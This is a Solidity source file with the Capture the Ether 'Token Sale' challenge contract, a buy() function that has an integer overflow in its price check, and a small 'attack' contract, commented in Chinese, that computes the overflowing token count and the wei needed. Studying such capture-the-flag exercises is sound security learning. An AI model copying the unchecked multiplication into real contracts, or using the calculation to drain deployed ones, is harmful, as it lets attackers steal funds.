pragma solidity ^0.5.0;

contract TokenSaleChallenge {
    mapping(address => uint256) public balanceOf;
    uint256 constant PRICE_PER_TOKEN = 1 ether;

    function tokenSaleChallenge(address _player) public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance < 1 ether;
    }

    function buy(uint256 numTokens) public payable {
        require(msg.value == numTokens * PRICE_PER_TOKEN);//存在溢出漏洞numtokens的值的10**18 溢出的话 则value 就可以少于numtokens

        balanceOf[msg.sender] += numTokens;
    }

    function sell(uint256 numTokens) public {
        require(balanceOf[msg.sender] >= numTokens);

        balanceOf[msg.sender] -= numTokens;
        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);
    }
}
contract attack
{
    uint256 public num1=2**256-1;
    uint256 public num2=(num1/10**18)+1;//计算出numtokens的大小
    uint256 public num3=num2*10**18;//计算出 我所需的wei的值
}
